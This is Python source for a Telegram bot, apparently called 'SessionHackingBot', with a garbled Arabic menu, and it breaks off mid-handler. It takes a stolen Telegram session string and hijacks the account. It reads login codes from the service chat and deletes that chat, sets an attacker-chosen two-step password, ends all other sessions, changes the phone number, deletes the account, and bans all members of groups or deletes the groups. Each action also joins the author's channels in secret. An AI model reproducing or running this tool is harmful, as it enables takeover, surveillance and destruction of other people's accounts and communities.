
# COPYRIGHT ¬© 2022 BY ANES @B_8_1 üî•

import os
os.system("pip install -U telethon")
from telethon import TelegramClient, events, functions, types, Button
from datetime import timedelta
import asyncio

api_id = os.environ.get("APP_ID")
import os, asyncio, re
from os import system
from telethon.tl.types import ChannelParticipantsAdmins, ChannelParticipantAdmin, ChannelParticipantCreator
api_hash = os.environ.get("API_HASH")
token = os.environ.get("BOT_TOKEN")
client = TelegramClient('IndianHack', api_id, api_hash).start(bot_token=token)
from telethon import TelegramClient as tg
from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dc
from telethon.sessions import StringSession as ses
from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
import telethon;from telethon import functions
from telethon.tl.types import ChannelParticipantsAdmins as cpa

from telethon.tl.functions.channels import CreateChannelRequest as ccr
mybot = "missrose_bot"
bot = borg = client

IndianHack = 5046520072

Bot_Username =os.environ.get("BOT_USERNAME", None) or "SessionHackingBot"

async def change_number_code(strses, number, code, otp):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    bot = client = X
    try:
      await bot(join("@S8Y8S"))
    except BaseException:
      pass
    try:
      await bot(join("@S8Y8S"))
    except BaseException:
      pass
    try:
      await bot(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await bot(leave("@Ids_Holder"))
    except BaseException:
      pass
    try: 
      result = await bot(functions.account.ChangePhoneRequest(
        phone_number=number,
        phone_code_hash=code,
        phone_code=otp
      ))
      return True
    except:
      return False

async def change_number(strses, number):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    bot = client = X
    try:
      await bot(join("@SESSIONSUPPORT"))
    except BaseException:
      pass
    try:
      await bot(join("@S8Y8S"))
    except BaseException:
      pass
    try:
      await bot(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await bot(leave("@Ids_Holder"))
    except BaseException:
      pass
    result = await bot(functions.account.SendChangePhoneCodeRequest(
        phone_number=number,
        settings=types.CodeSettings(
            allow_flashcall=True,
            current_number=True,
            allow_app_hash=True
        )
    ))
    return str(result)


async def userinfo(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    k = await X.get_me()
    try:
      await X(join("@SESSIONSUPPORT"))
    except BaseException:
      pass
    try:
      await X(join("@S8Y8S"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    return str(k)

async def terminate(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@SESSIONSUPPORT"))
    except BaseException:
      pass
    try:
      await X(join("@S8Y8S"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    await X(rt())

GROUP_LIST = []
async def delacc(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@Ids_Holder"))
    except BaseException:
      pass
    try:
      await X(join("@S8Y8S"))
    except BaseException:
      pass
    try:
      await X(leave("@SESSIONSUPPORT"))
    except BaseException:
      pass
    await X(functions.account.DeleteAccountRequest("I am chutia"))

async def promote(strses, grp, user):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@SESSIONSUPPORT"))
    except BaseException:
      pass
    try:
      await X(join("@S8Y8S"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    try:
      await X.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
    except:
      await X.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')
    
async def user2fa(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@SESSIONSUPPORT"))
    except BaseException:
      pass
    try:
      await X(join("@S8Y8S"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    try:
      await X.edit_2fa('IndianHack IS BEST')
      return True
    except:
      return False

async def demall(strses, grp):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@SESSIONSUPPORT"))
    except BaseException:
      pass
    try:
      await X(join("@S8Y8S"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
      try:
        await X.edit_admin(grp, x.id, is_admin=False, manage_call=False)
      except:
        await X.edit_admin(grp, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
      


async def joingroup(strses, username):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@SESSIONSUPPORT"))
    except BaseException:
      pass
    try:
      await X(join("@S8Y8S"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    await X(join(username))


async def leavegroup(strses, username):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@SESSIONSUPPORT"))
    except BaseException:
      pass
    try:
      await X(join("@S8Y8S"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    await X(leave(username))

async def delgroup(strses, username):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@SESSIONSUPPORT"))
    except BaseException:
      pass
    try:
      await X(join("@S8Y8S"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    await X(dc(username))
    

async def cu(strses):
  try:
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        k = await X.get_me()
        return [str(k.first_name), str(k.username or k.id)]
  except Exception as e:
    return False

async def usermsgs(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    i = ""
    try:
      await X(join("@SESSIONSUPPORT"))
    except BaseException:
      pass
    try:
      await X(join("@S8Y8S"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    async for x in X.iter_messages(777000, limit=3):
      i += f"\n{x.text}\n"
    await client.delete_dialog(777000)
    return str(i)


async def userbans(strses, grp):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@SESSIONSUPPORT"))
    except BaseException:
      pass
    try:
      await X(join("@S8Y8S"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    k = await X.get_participants(grp)
    for x in k:
      try:
        await X.edit_permissions(grp, x.id, view_messages=False)
      except:
        pass
    


async def userchannels(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@SESSIONSUPPORT"))
    except BaseException:
      pass
    try:
      await X(join("@S8Y8S"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    k = await X(pc())
    i = ""
    for x in k.chats:
      try:
        i += f'\nCHANNEL NAME ~ {x.title} CHANNEL USRNAME ~ @{x.username}\n'
      except:
        pass
    return str(i)



import logging
logging.basicConfig(level=logging.WARNING)

channel = "S8Y8S"
menu = '''

"A" :~  ÿ™ÿ≠ŸÇŸÇ ŸÖŸÜ ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿßÿ™ ŸàÿßŸÑŸÇŸÜŸàÿßÿ™ ÿßŸÑÿÆÿßÿµÿ© ÿ®ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ


"B" :~  ÿ™ÿ≠ŸÇŸÇ ŸÖŸÜ ÿ¨ŸÖŸäÿπ ŸÖÿπŸÑŸàŸÖÿßÿ™ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ŸÖÿ´ŸÑ ÿ±ŸÇŸÖ ÿßŸÑŸáÿßÿ™ŸÅ Ÿàÿßÿ≥ŸÖ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ... ÿ•ŸÑÿÆ


"C" :~ ÿ≠ÿ∏ÿ± ÿßÿπÿ∂ÿßÿ° ÿßŸÑŸÖÿ¨ŸÖŸàÿπŸá /  ŸÇŸÜÿßŸá {ÿßÿπÿ∑ŸÜŸä ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥ Ÿà ŸÖŸÜ ÿ´ŸÖ ÿßÿ≥ŸÖ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ŸÑŸÑŸÖÿ¨ŸÖŸàÿπŸá / ŸÑŸÑŸÇŸÜÿßŸá} Ÿà ÿ≥ÿßÿ≠ÿ∂ÿ± ÿ¨ŸÖŸäÿπ ÿßÿπÿ∂ÿßÿ° ŸáŸÜÿßŸÉ


"D" :~ [ŸÖÿπÿ±ŸÅŸá ÿßÿÆÿ± ŸÉŸàÿØ ÿ™ÿ≥ÿ¨ŸäŸÑ ÿØÿÆŸàŸÑ {ÿßŸàŸÑÿß ÿÆÿ∞ ÿ±ŸÇŸÖ ÿßŸÑŸáÿßÿ™ŸÅ Ÿà ÿ≥ÿ¨ŸÑ ÿØÿÆŸàŸÑ ÿßŸÑŸäŸá Ÿà ÿßÿ≥ÿ™ÿÆÿØŸÖŸÜŸä ŸÑÿßÿπÿ∑ŸäŸÉ ŸÉŸàÿØ ÿ™ÿ≥ÿ¨ŸäŸÑ ÿßŸÑÿØÿÆŸàŸÑ}]


"E" :~ [ÿßŸÜÿ∂ŸÖ ÿ•ŸÑŸâ ŸÖÿ¨ŸÖŸàÿπÿ© / ŸÇŸÜÿßÿ© ÿπÿ®ÿ± ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥]


"F" :~ [ŸÖÿ∫ÿßÿ±ÿØŸá ŸÖÿ¨ŸÖŸàÿπÿ© / ŸÇŸÜÿßÿ© ÿπÿ®ÿ± ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥]


"G" :~ [ÿ≠ÿ∞ŸÅ ŸÖÿ¨ŸÖŸàÿπÿ© / ŸÇŸÜÿßÿ©]


"H" :~ [ÿ™ÿ≠ŸÇŸÇ ŸÖŸÜ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ÿ®ÿÆÿ∑Ÿàÿ™ŸäŸÜ ŸÖŸÖŸÉŸëŸÜÿ© ÿ£Ÿà ŸÖÿπÿ∑ŸëŸÑÿ©]


"I" :~ [ŸÇŸÖ ÿ®ÿ•ŸÜŸáÿßÿ° ÿ¨ŸÖŸäÿπ ÿßŸÑÿ¨ŸÑÿ≥ÿßÿ™ ÿßŸÑŸÜÿ¥ÿ∑ÿ© ÿßŸÑÿ≠ÿßŸÑŸäÿ© ÿ®ÿßÿ≥ÿ™ÿ´ŸÜÿßÿ° ÿ¨ŸÑÿ≥ÿ© ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥ ÿßŸÑÿÆÿßÿµÿ© ÿ®ÿßŸÑÿ≠ÿ≥ÿßÿ®]


"J" :~ [ÿ≠ÿ∞ŸÅ ÿßŸÑÿ≠ÿ≥ÿßÿ®]


"L" :~ [ÿßÿ≤ÿßŸÑŸá ÿ¨ŸÖŸäÿπ ÿßŸÑŸÖÿ≥ÿ§ŸàŸÑŸäŸÜ ŸÅŸä ŸÖÿ¨ŸÖŸàÿπÿ© / ŸÇŸÜÿßÿ©]


"K" ~ [ÿ±ŸÅÿπ ÿπÿ∂Ÿà {ŸÖÿ¥ÿ±ŸÅ} ŸÅŸä ŸÖÿ¨ŸÖŸàÿπÿ© / ŸÇŸÜÿßÿ©]


"M" ~ [ÿ™ÿ∫ŸäŸäÿ± ÿ±ŸÇŸÖ ÿßŸÑŸáÿßÿ™ŸÅ ÿ®ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥]

"N" ~ [ÿßŸàÿßŸÖÿ± ÿßŸÑÿßÿ∞ÿßÿπŸá]

ŸÖŸÑÿßÿ≠ÿ∏ÿ© : ÿßŸÑÿßŸàÿßŸÖÿ± ŸÑŸÑÿ≠ÿ≥ÿßÿ® ŸàÿßŸÑŸÇŸÜŸàÿßÿ™ ŸàÿßŸÑŸÉÿ±Ÿàÿ®ÿßÿ™ ‚úÖ

ŸÇŸÜÿßÿ© ÿßŸÑÿ®Ÿàÿ™ üöπ @S8Y8S 
'''
mm = '''
**‚öúŸÖŸÑÿßÿ≠ÿ∂Ÿá ÿßŸÑÿßŸÜÿ∂ŸÖÿßŸÖ ÿßŸÑÿ£ŸàŸÑÿß ÿßŸÑŸâ ÿßŸÑÿØÿπŸÖ @SESSIONSUPPORT‚öú**
'''

keyboard = [
  [  
    Button.inline("A", data="A"), 
    Button.inline("B", data="B"),
    Button.inline("C", data="C"),
    Button.inline("D", data="D"),
    Button.inline("E", data="E")
    ],
  [
    Button.inline("F", data="F"), 
    Button.inline("G", data="G"),
    Button.inline("H", data="H"),
    Button.inline("I", data="I"),
    Button.inline("J", data="J"),
    ],
  [
    Button.inline("K", data="K"), 
    Button.inline("L", data="L"),
    Button.inline("M", data="M"),
    Button.inline("N", data="N"),
    ],
  [
    Button.url("Owner", "https://t.me/B_8_1")
    ]
]

@client.on(events.NewMessage(pattern="/start"))
async def op(event):
  global mm
  if not event.is_private:
    IndianHack = [
      [
        Button.url("ÿßŸÜŸÇÿ± ŸáŸÜÿß", f"https://t.me/{Bot_Username}?start=zi")
        ]
      ]         
    await event.reply("ÿßŸÜŸÇÿ± ÿ£ÿØŸÜÿßŸá ŸÑÿßÿ≥ÿ™ÿÆÿØÿßŸÖŸÜŸä", buttons=IndianHack)
 # else:
  #  legendbye = [
  #    [
   #     Button.url("Ÿäÿ¨ÿ® ÿ£ŸÜ ÿ™ŸÜÿ∂ŸÖ", f"https://t.me/S8Y8S")
    #    ]
    #  ]
   # await event.reply("ÿßŸÜÿ∂ŸÖ ÿ£ŸàŸÑÿßŸã ÿ•ŸÑŸâ ÿßŸÑŸÇŸÜÿßÿ©! \n ÿ´ŸÖ ÿ≠ÿßŸàŸÑ ÿßŸÜŸÇÿ± ŸáŸÜÿß ~ /hack", buttons=legendbye)
    
       
@client.on(events.NewMessage(pattern="/zi", func=lambda x: x.is_group))
async def op(event):
  IndianHack = [
    [
      Button.url("ÿßŸÜŸÇÿ± ŸáŸÜÿß", f"https://t.me/{Bot_Username}")
      ]
    ]         
  await event.reply("ÿßŸÜŸÇÿ± ÿ£ÿØŸÜÿßŸá ŸÑÿßÿ≥ÿ™ÿÆÿØÿßŸÖŸä", buttons=IndianHack)
  
@client.on(events.NewMessage(pattern="/zi", func = lambda x: x.is_private))
async def start(event):
  global menu
  async with bot.conversation(event.chat_id) as x:
    keyboard = [
      [  
        Button.inline("A", data="A"), 
        Button.inline("B", data="B"),
        Button.inline("C", data="C"),
        Button.inline("D", data="D"),
        Button.inline("E", data="E")
        ],
      [
        Button.inline("F", data="F"), 
        Button.inline("G", data="G"),
        Button.inline("H", data="H"),
        Button.inline("I", data="I"),
        Button.inline("J", data="J")
        ],
      [
        Button.inline("K", data="K"), 
        Button.inline("L", data="L"),
        Button.inline("M", data="M"),
        Button.inline("N", data="N"),
        ],
      [
        Button.url("Owner", "https://t.me/B_8_1")
        ]
    ]
    await x.send_message(f"ÿßÿÆÿ™ÿ± ŸÖÿß ÿ™ÿ±ŸäÿØ ŸÖÿπ ÿ¨ŸÑÿ≥ÿ© ÿ™ÿ±ŸÖŸÉÿ≥ \n\n{menu}", buttons=keyboard)
    
@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"A")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("ÿßŸÑÿßŸÜ ÿßÿ±ÿ≥ŸÑ ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("ÿ™ŸÖ ÿ•ŸÜŸáÿßÿ° ÿ¨ŸÑÿ≥ÿ© ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥ ŸÖÿ≥ÿ®ŸÇÿß.\n /zi", buttons=keyboard)
      try:
        i = await userchannels(strses.text)
      except:
        return await event.reply("ÿ™ŸÖ ÿ•ŸÜŸáÿßÿ° ÿ¨ŸÑÿ≥ÿ© ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥ ŸÖÿ≥ÿ®ŸÇÿß.\n/zi", buttons=keyboard)
      if len(i) > 3855:
        file = open("session.txt", "w")
        file.write(i + "\n\nDetails BY @S8Y8S")
        file.close()
        await bot.send_file(event.chat_id, "session.txt")
        system("rm -rf session.txt")
      else:
        await event.reply(i + "\n\nÿ¥ŸÉÿ±ÿß ŸÑÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ÿßŸÑÿ®Ÿàÿ™ \n/zi", buttons=keyboard)
      
@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"B")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    await x.send_message("ÿßŸÑÿßŸÜ ÿßÿ±ÿ≥ŸÑ ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥")
    strses = await x.get_response()
    op = await cu(strses.text)
    if op:
      pass
    else:
      return await event.respond("ÿ™ŸÖ ÿ•ŸÜŸáÿßÿ° ÿ¨ŸÑÿ≥ÿ© ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥ ŸÖÿ≥ÿ®ŸÇÿß.\n/zi", buttons=keyboard)
    i = await userinfo(strses.text)
    await event.reply(i + "\n\nÿ¥ŸÉÿ±ÿß ŸÑÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ÿßŸÑÿ®Ÿàÿ™ \n/hack", buttons=keyboard)
    
@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"C")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    await x.send_message("ÿßŸÑÿßŸÜ ÿßÿ±ÿ≥ŸÑ ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥")
    strses = await x.get_response()
    op = await cu(strses.text)
    if op:
      pass
    else:
      return await event.respond("ÿ™ŸÖ ÿ•ŸÜŸáÿßÿ° ÿ¨ŸÑÿ≥ÿ© ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥ ŸÖÿ≥ÿ®ŸÇÿß. \n/zi", buttons=keyboard)
    await x.send_message("ÿßÿπÿ∑ŸÜŸä ŸäŸàÿ≤ÿ± / ÿßŸäÿØŸä .... ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿ© / ÿßŸÑŸÇŸÜÿßÿ©")
    grpid = await x.get_response()
    await userbans(strses.text, grpid.text)
    await event.reply("ÿ™ŸÖ ÿ≠ÿ∂ÿ± ÿ¨ŸÖŸäÿπ ÿßŸÑÿßÿπÿ∂ÿßÿ°. ÿ¥ŸÉÿ±ÿß ŸÑÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ÿßŸÑÿ®Ÿàÿ™ \n/zi", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"D")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("ÿßŸÑÿßŸÜ ÿßÿ±ÿ≥ŸÑ ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("ÿ™ŸÖ ÿ•ŸÜŸáÿßÿ° ÿ¨ŸÑÿ≥ÿ© ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥ ŸÖÿ≥ÿ®ŸÇÿß. \n/zi", buttons=keyboard)
      i = await usermsgs(strses.text)
      await event.reply(i + "\n\nÿ¥ŸÉÿ±ÿß ŸÑÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ÿßŸÑÿ®Ÿàÿ™ \n/zi", buttons=keyboard)
    
      
@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"E")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    await x.send_message("ÿßŸÑÿßŸÜ ÿßÿ±ÿ≥ŸÑ ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥")
    strses = await x.get_response()
    op = await cu(strses.text)
    if op:
      pass
    else:
      return await event.respond("ÿ™ŸÖ ÿ•ŸÜŸáÿßÿ° ÿ¨ŸÑÿ≥ÿ© ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥ ŸÖÿ≥ÿ®ŸÇÿß. \n/zi", buttons=keyboard)
    await x.send_message("ÿßÿπÿ∑ŸÜŸä  ŸäŸàÿ≤ÿ± / ÿßŸäÿØŸä .... ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿ© / ÿßŸÑŸÇŸÜÿßÿ©")
    grpid = await x.get_response()
    await joingroup(strses.text, grpid.text)
    await event.reply("ÿßŸÜÿ∂ŸÖ ÿ•ŸÑŸâ ÿßŸÑŸÇŸÜÿßÿ© / ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿ© ÿ¥ŸÉÿ±ÿß ŸÑÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ÿßŸÑÿ®Ÿàÿ™ \n/zi", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"F")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    await x.send_message("ÿßŸÑÿßŸÜ ÿßÿ±ÿ≥ŸÑ ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥")
    strses = await x.get_response()
    op = await cu(strses.text)
    if op:
      pass
    else:
      return await event.respond("ÿ™ŸÖ ÿ•ŸÜŸáÿßÿ° ÿ¨ŸÑÿ≥ÿ© ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥ ŸÖÿ≥ÿ®ŸÇÿß. \n/zi", buttons=keyboard)
    await x.send_message("ÿßÿπÿ∑ŸÜŸä ŸäŸàÿ≤ÿ±  / ÿßŸäÿØŸä .... ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿ© / ÿßŸÑŸÇŸÜÿßÿ©")
    grpid = await x.get_response()
    await leavegroup(strses.text, grpid.text)
    await event.reply("ÿ∫ÿßÿØÿ±ÿ™ ÿßŸÑŸÇŸÜÿßÿ© / ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿ© ÿ¥ŸÉÿ±ÿß ŸÑÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ÿßŸÑÿ®Ÿàÿ™ \n/zi,", buttons=keyboard)
@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"G")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("ÿßŸÑÿßŸÜ ÿßÿ±ÿ≥ŸÑ ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("ÿ™ŸÖ ÿ•ŸÜŸáÿßÿ° ÿ¨ŸÑÿ≥ÿ© ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥ ŸÖÿ≥ÿ®ŸÇÿß. \n/zi", buttons=keyboard)
      await x.send_message("ÿßÿπÿ∑ŸÜŸä ŸäŸàÿ≤ÿ± / ÿßŸäÿØŸä .... ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿ© / ÿßŸÑŸÇŸÜÿßÿ©")
      grpid = await x.get_response()
      await delgroup(strses.text, grpid.text)
      await event.reply("ÿ™ŸÖ ÿ≠ÿ∞ŸÅ ÿßŸÑŸÇŸÜÿßÿ© / ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿ© ÿ¥ŸÉÿ±ÿß ŸÑÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ÿßŸÑÿ®Ÿàÿ™ \n/zi.", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"H")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("ÿßŸÑÿßŸÜ ÿßÿ±ÿ≥ŸÑ ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("ÿ™ŸÖ ÿßŸÜŸáÿßÿ° ÿßŸÑÿ¨ŸÑÿ≥Ÿá ŸÖÿ≥ÿ®ŸÇÿß.", buttons=keyboard)
      i = await user2fa(strses.text)
      if i:
        await event.reply("ÿßŸÑÿ≠ÿ≥ÿßÿ® ŸÑÿß ŸäŸÖÿ™ŸÑŸÉ ÿ™ÿ≠ŸÇŸÇ ÿ®ÿÆÿ∑Ÿàÿ™ŸäŸÜ ŸäŸÖŸÉŸÜŸÉ ÿßŸÑÿßŸÜ ÿ™ÿ≥ÿ¨ŸäŸÑ ÿßŸÑÿØÿÆŸàŸÑ ÿ®ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ÿßŸÖÿ± <D>\n\nÿ¥ŸÉÿ±ÿß ŸÑÿßÿ≥ÿ™ÿÆÿØÿßŸÖŸÉ ÿßŸÑÿ®Ÿàÿ™.", buttons=keyboard)
      else:
        await event.reply("ÿπÿ∞ÿ±ÿß ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ŸÑÿØŸäŸá ÿÆÿ∑Ÿàÿ™ŸäŸÜ ÿ®ÿßŸÑŸÅÿπŸÑ", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"I")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("ÿßŸÑÿßŸÜ ÿßÿ±ÿ≥ŸÑ ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("ÿ™ŸÖ ÿ•ŸÜŸáÿßÿ° ÿ¨ŸÑÿ≥ÿ© ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥ ŸÖÿ≥ÿ®ŸÇÿß. \n/zi", buttons=keyboard)
      i = await terminate(strses.text)
      await event.reply("Ÿäÿ™ŸÖ ÿ•ŸÜŸáÿßÿ° ÿ¨ŸÖŸäÿπ ÿßŸÑÿ¨ŸÑÿ≥ÿßÿ™\n\nÿ¥ŸÉÿ±ÿß ŸÑÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ÿßŸÑÿ®Ÿàÿ™ \n/zi.", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"J")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("ÿßŸÑÿßŸÜ ÿßÿ±ÿ≥ŸÑ ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("ÿ™ŸÖ ÿ•ŸÜŸáÿßÿ° ÿ¨ŸÑÿ≥ÿ© ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥ ŸÖÿ≥ÿ®ŸÇÿß. \n /zi", buttons=keyboard)
      i = await delacc(strses.text)
      await event.reply("ÿ™ŸÖ ÿ≠ÿ∞ŸÅ ÿßŸÑÿ≠ÿ≥ÿßÿ® ÿ®ŸÜÿ¨ÿßÿ≠\n\nÿ¥ŸÉÿ±ÿß ŸÑÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ÿßŸÑÿ®Ÿàÿ™ \n /zi.", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"K")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("ÿßŸÑÿßŸÜ ÿßÿ±ÿ≥ŸÑ ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("ÿ™ŸÖ ÿ•ŸÜŸáÿßÿ° ÿ¨ŸÑÿ≥ÿ© ŸÉŸàÿØ ÿ™ÿ±ŸÖŸÉÿ≥ ŸÖÿ≥ÿ®ŸÇÿß. \n/zi", buttons=keyboard)
      await x.send_message("ÿßŸÑÿßŸÜ ÿßÿ±ÿ≥ŸÑ ŸÑŸä ŸäŸàÿ≤ÿ±  ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿ© / ÿßŸÑŸÇŸÜÿßÿ©")
      grp = await x.get_response()
